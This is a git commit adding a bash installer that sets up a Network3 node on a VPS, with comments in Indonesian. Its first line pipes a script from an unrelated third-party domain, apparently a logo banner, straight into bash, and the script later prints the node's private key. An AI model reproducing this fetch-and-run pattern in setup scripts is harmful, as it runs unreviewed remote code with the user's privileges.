09112423e6bac84d47bcb77fed68861c0bbadc07
0xwhyteddy <0xwhyteddy@gmail.com>
2025-01-13 02:11:34 +0700

    Add files via upload

---
+++ network3.sh
@@ -0,0 +1,44 @@
+#!/bin/bash
+
+curl -s https://data.zamzasalim.xyz/file/uploads/asclogo.sh | bash
+sleep 2
+
+# Fungsi untuk menampilkan teks berwarna hijau
+print_green() {
+    echo -e "\e[32m$1\e[0m"
+}
+
+# Update dan upgrade sistem
+echo "Melakukan update dan upgrade sistem..."
+sudo apt update && sudo apt upgrade -y
+
+# Install net-tools
+echo "Menginstal net-tools..."
+sudo apt install net-tools -y
+
+sudo ufw allow 8080
+sudo ufw enable
+sudo ufw status
+
+# Download dan ekstrak file
+echo "Menyiapkan direktori dan mendownload file..."
+cd $HOME
+wget https://network3.io/ubuntu-node-v2.1.1.tar.gz
+tar -xzf ubuntu-node-v2.1.1.tar.gz
+
+sleep 2
+# Masuk ke folder ubuntu-node dan menjalankan manager.sh
+echo "Menjalankan manager.sh..."
+cd ubuntu-node
+sudo bash manager.sh up
+
+# Dapatkan private key dan hubungkan
+echo "Mengambil private key"
+sudo bash manager.sh key | print_green
+
+# Menentukan IP VPS
+VPS_IP=$(hostname -I | awk '{print $1}')
+
+# Menampilkan URL dan instruksi untuk mengganti IP dengan IP VPS setelah proses selesai
+echo "Done. Silakan buka web dengan link dibawah dan koneksikan private keymu"
+print_green "https://account.network3.ai/main?o=${VPS_IP}:8080"
